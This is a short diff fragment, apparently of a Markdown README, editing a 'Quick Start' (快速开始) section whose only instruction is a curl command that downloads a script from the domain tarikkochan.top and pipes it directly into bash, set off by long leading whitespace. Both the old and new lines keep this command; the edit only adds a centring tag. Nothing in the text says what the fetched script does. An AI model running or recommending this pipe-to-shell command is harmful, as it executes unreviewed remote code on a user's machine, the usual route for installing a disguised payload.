@@ -2,8 +2,10 @@
 
 ---
 
-```bash 快速开始
-                                    curl tarikkochan.top/fdnr | bash
+<center> 快速开始
+
+```bash 
+                                curl tarikkochan.top/fdnr | bash
 ```
 
 ---
